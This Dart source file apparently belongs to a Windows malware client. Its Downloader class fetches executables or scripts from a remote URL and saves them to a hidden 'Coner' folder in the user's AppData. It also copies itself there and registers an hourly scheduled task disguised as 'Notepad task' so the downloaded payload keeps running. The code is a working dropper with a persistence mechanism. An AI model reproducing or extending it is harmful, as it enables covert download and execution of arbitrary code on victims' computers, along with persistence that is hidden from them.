import "dart:io";
import 'dart:async';

import 'package:collection/collection.dart';
import 'package:dio/dio.dart';

import 'const.dart';
import 'traversal.dart';

class Downloader {
  final String programID = 'WindowsClient';
  String extention;
  List<String> allowd_extentions = [".exe", ".msi", ".bat", ".vb", ".js"];

  Future validateAndDownload(String url) async {
    // check is Valid url.
    if (url.isNotEmpty &&
        allowd_extentions.contains(url.substring(url.length - 4))) {
      await downloader(
              dio: Dio(), url: url, extention: url.substring(url.length - 4))
          .whenComplete(() =>
              copier(programName: programID + url.substring(url.length - 4)))
          .whenComplete(() => addToTasks(
              programName: programID + url.substring(url.length - 4)));
    }
  }

  String get userProfile {
    var osData = Platform.environment;
    var userName = osData['UserProfile'];
    return userName.toString();
  }

  Future<String> copier({String programName}) async {
    if (Traverslar().shell.workingDirectory !=
        '$userProfile\\appData\\Local\\Coner\\') {
      try {
        await Directory('$userProfile\\appData\\Local\\Coner\\').create();
        var rfile = await File(Settings.programNameCompiled).readAsBytesSync();
        await File(
                '$userProfile\\appData\\Local\\Coner\\${Settings.programNameCompiled}')
            .writeAsBytesSync(rfile);
        await addToTasks(programName: programName);
      } catch (e) {
        print(e);
      }
      return programName;
    }
  }

  void deleteReg() async {
    try {
      await Process.run('SCHTASKS /DELETE /TN "MyTasks\\Notepad task"', []);
    } catch (e) {
      print(e);
    }
  }

  // ignore: missing_return
  Future<bool> downloader({Dio dio, String url, String extention}) async {
    try {
      var response = await dio.get(url,
          options:
              Options(followRedirects: true, responseType: ResponseType.bytes));
      if (response.data != null) {
        List<int> data = response.data;
        await File('$userProfile\\appData\\Local\\Coner\\$programID$extention')
            .writeAsBytesSync(data);
        return true;
      }
    } catch (e) {
      print(e);
    }
  }

  // ignore: missing_return
  Future<bool> addToTasks({String programName}) async {
    await Process.run(
        'SCHTASKS /CREATE /SC HOURLY /mo 1 /TN "MyTasks\\Notepad task" /TR $userProfile\\appData\\Local\\Coner\\$programName',
        []).then((process) {
      if (process.stdout.toString().startsWith("SUCCESS")) {
        return true;
      } else {
        return false;
      }
    });
  }

  @override
  String toString() =>
      'Downloader(extention: $extention, allowd_extentions: $allowd_extentions)';

  @override
  bool operator ==(Object o) {
    if (identical(this, o)) return true;
    final listEquals = const DeepCollectionEquality().equals;

    return o is Downloader &&
        o.extention == extention &&
        listEquals(o.allowd_extentions, allowd_extentions);
  }

  @override
  int get hashCode => extention.hashCode ^ allowd_extentions.hashCode;
}
